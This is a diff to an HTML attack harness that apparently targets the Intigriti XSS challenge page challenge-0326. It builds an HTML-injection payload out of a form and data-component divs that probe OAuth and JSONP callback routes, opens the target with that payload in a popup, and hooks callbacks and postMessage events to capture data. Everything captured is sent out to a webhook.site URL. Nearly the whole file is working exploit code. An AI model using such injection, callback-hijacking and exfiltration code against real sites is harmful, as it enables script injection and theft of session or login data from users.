@@ -1,7 +1,7 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>challenge0326 event probe</title>
-<body>event-probe</body>
+<title>challenge0326 opener harness</title>
+<body>opener-harness</body>
 <script>
 const sink = 'https://webhook.site/caaac3a6-72f9-4933-ae3a-1a8e17e3baf4';
 
@@ -40,13 +40,78 @@ function installEventLogging(prefix) {
   });
 }
 
+window.Auth = {
+  loginRedirect(data) {
+    ping('opener:Auth.loginRedirect:' + JSON.stringify(data));
+  }
+};
+window.callback = data => ping('opener:callback:' + JSON.stringify(data));
+window.cb = data => ping('opener:cb:' + JSON.stringify(data));
+window.jsonp = data => ping('opener:jsonp:' + JSON.stringify(data));
+window.jsoncallback = data => ping('opener:jsoncallback:' + JSON.stringify(data));
+
+addEventListener('message', event => {
+  let data = '';
+  try {
+    data = JSON.stringify(event.data);
+  } catch (err) {
+    data = String(event.data);
+  }
+  ping('opener:message:' + event.origin + ':' + data);
+});
+
+function buildPayload() {
+  const routes = [
+    { path: '/components/', type: 'default' },
+    { path: '/components/', type: 'auth' },
+    { path: '/components/', type: 'callback' },
+    { path: '/components/', type: 'login' },
+    { path: '/components/', type: 'redirect' },
+    { path: '/components/', type: 'session' },
+    { path: '/components/', type: 'internal' },
+    { path: '/components/', type: 'admin' },
+    { path: '/components/', type: 'auth-callback' },
+    { path: '/components/', type: 'login-redirect' },
+    { path: '/js/', type: 'auth-callback' },
+    { path: '/js/', type: 'login-redirect' },
+    { path: '/', type: 'auth/callback?callback=Auth.loginRedirect#' },
+    { path: '/', type: 'login/callback?callback=Auth.loginRedirect#' },
+    { path: '/', type: 'callback?callback=Auth.loginRedirect#' },
+    { path: '/', type: 'auth?callback=Auth.loginRedirect#' },
+    { path: '/', type: 'session?callback=Auth.loginRedirect#' },
+    { path: '/', type: 'api/auth/callback?callback=Auth.loginRedirect#' },
+    { path: '/', type: 'api/session?callback=Auth.loginRedirect#' },
+    { path: '/', type: 'oauth/callback?callback=Auth.loginRedirect#' },
+    { path: '/', type: 'oidc/callback?callback=Auth.loginRedirect#' },
+    { path: '/', type: 'sso/callback?callback=Auth.loginRedirect#' },
+    { path: '/', type: 'auth/complete?callback=Auth.loginRedirect#' },
+    { path: '/', type: 'auth/redirect?callback=Auth.loginRedirect#' },
+    { path: '/', type: 'auth/callback?cb=callback#' },
+    { path: '/', type: 'auth/callback?jsonp=jsonp#' },
+    { path: '/', type: 'auth/callback?jsoncallback=jsoncallback#' }
+  ];
+
+  const parts = [
+    '<form name=authConfig data-next="' + sink + '?batch=ext1" data-append="true"></form>'
+  ];
+  for (const route of routes) {
+    const config = JSON.stringify(route);
+    parts.push('<div data-component="true" data-config=\'' + config + '\'></div>');
+  }
+  return parts.join('');
+}
+
 installEventLogging('main');
 ping('main:boot:' + navigator.userAgent);
 
+const payload = buildPayload();
+const target = 'https://challenge-0326.intigriti.io/challenge.html?q=' + encodeURIComponent(payload);
+ping('main:target-len:' + String(target.length));
+
 let popup = null;
 try {
-  popup = window.open('/popup.html', '_blank');
-  ping('main:popup-open:' + (!!popup));
+  popup = window.open(target, 'intigriti-opener-probe');
+  ping('main:popup-open:' + String(!!popup));
 } catch (e) {
   ping('main:popup-open-err:' + e.name + ':' + e.message);
 }
@@ -60,6 +125,14 @@ setTimeout(() => {
 }, 3000);
 
 setTimeout(() => {
+  try {
+    ping('main:popup-closed-late:' + (popup ? String(popup.closed) : 'null'));
+  } catch (e) {
+    ping('main:popup-closed-late-err:' + e.name + ':' + e.message);
+  }
+}, 10000);
+
+setTimeout(() => {
   document.body.textContent = 'done';
-}, 4000);
+}, 12000);
 </script>
